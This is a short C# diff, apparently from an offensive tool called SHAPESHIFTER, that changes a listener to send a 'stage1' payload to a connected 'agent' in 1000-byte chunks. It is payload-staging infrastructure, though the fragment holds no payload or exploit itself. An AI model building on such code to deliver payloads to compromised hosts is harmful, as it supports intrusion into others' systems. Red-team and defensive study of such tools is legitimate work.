@@ -73,11 +73,19 @@ namespace SHAPESHIFTER
                         //byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
 
                         // Send back a response.
-                        stream.Write(stage1, 0, stage1.Length);
-                        Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
+                        //stream.Write(stage1, 0, stage1.Length);
+                        //Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
+                        int stageSize = stage1.Length;
+                        int chunkCount = (stageSize + 999) / 1000;
+                        Console.WriteLine("  [>] Sending total of {0} bytes to the agent...", stageSize);
+                        for (int j = 0; j < chunkCount; j++)
+                        {
+                            stream.Write(Helpers.BufferSplit(stage1, 1000)[j], 0, Helpers.BufferSplit(stage1, 1000)[j].Length);
+                            Console.WriteLine("  [>] Sent {0} bytes back to the agent", Helpers.BufferSplit(stage1, 1000)[j].Length);
+                        }
                     }
 
-                    // Shutdown and end connection
+                    // Shutdown and end connection 
                     client.Close();
                 }
             }
